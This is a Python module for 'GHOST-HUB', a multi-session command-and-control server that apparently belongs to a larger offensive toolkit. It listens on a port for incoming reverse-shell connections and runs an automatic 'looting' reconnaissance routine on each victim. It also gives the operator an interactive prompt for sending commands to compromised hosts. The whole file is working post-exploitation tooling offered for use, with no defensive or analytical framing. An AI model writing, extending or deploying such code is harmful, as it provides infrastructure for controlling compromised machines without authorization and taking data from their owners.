# --- Module Context: GHOST-HUB (C2 Engine) ---
# Purpose: Multi-session manager with automated post-exploitation tasks.
# ---------------------------------------------

import socket
import threading
import time
from rich.console import Console
from rich.table import Table
from core.ui import draw_header, show_briefing
from modules.looter import auto_recon

console = Console()


class GhostHub:
    def __init__(self):
        self.sessions = {}  # {id: {'socket': s, 'addr': a, 'status': '...'}}
        self.counter = 1
        self.lock = threading.Lock()

    def start_hub(self, port=4444):
        """Unified Listener: Replaces modules/listener.py."""
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            server.bind(("0.0.0.0", int(port)))
            server.listen(50)
            while True:
                conn, addr = server.accept()
                with self.lock:
                    s_id = self.counter
                    self.sessions[s_id] = {'socket': conn,
                                           'addr': addr, 'status': 'Looting...'}
                    self.counter += 1
                # Background Auto-Looting
                threading.Thread(target=self.initial_loot,
                                 args=(s_id,), daemon=True).start()
        except Exception as e:
            console.print(f"[red]Server Error:[/red] {e}")

    def initial_loot(self, s_id):
        """Zero-Touch Intel Gathering."""
        try:
            sock = self.sessions[s_id]['socket']
            intel = auto_recon(sock)
            with self.lock:
                self.sessions[s_id]['status'] = f"Online ({intel['user']}@{intel['host']})"
        except:
            with self.lock:
                self.sessions[s_id]['status'] = "Online (Active)"

    def interact(self, s_id):
        """Interactive Shell Interaction."""
        if s_id not in self.sessions:
            return
        sock = self.sessions[s_id]['socket']
        console.print(
            f"[bold red][!] Controlling Ghost {s_id}. Type 'back' to detach.[/bold red]")
        while True:
            cmd = console.input(f"Ghost-{s_id}> ").strip()
            if cmd.lower() == "back":
                break
            if not cmd:
                continue
            try:
                sock.send((cmd + "\n").encode())
                # Dynamic buffer handling for large responses
                data = sock.recv(8192).decode()
                console.print(data)
            except Exception as e:
                console.print(f"[red]Lost Connection:[/red] {e}")
                break


hub = GhostHub()


def run_ghost_hub():
    show_briefing("GHOST-HUB C2", "Multi-session C2 management.",
                  ["LPORT must match payloads"])
    port = console.input(
        "[bold yellow]C2 Port (Default 4444): [/bold yellow]") or "4444"

    # Run the server in a daemon thread so it stays active
    threading.Thread(target=hub.start_hub, args=(port,), daemon=True).start()

    while True:
        draw_header("C2 Dashboard")
        table = Table(
            title=f"Hub Active on Port {port}", border_style="magenta")
        table.add_column("ID", style="yellow")
        table.add_column("Target IP", style="cyan")
        table.add_column("Intel / Status", style="green")

        with hub.lock:
            for sid, data in hub.sessions.items():
                table.add_row(str(sid), data['addr'][0], data['status'])

        console.print(table)
        choice = console.input(
            "\n[Hub] (interact <id> / exit)> ").strip().split()
        if not choice:
            continue
        if choice[0] == "exit":
            break
        if choice[0] == "interact" and len(choice) > 1:
            hub.interact(int(choice[1]))
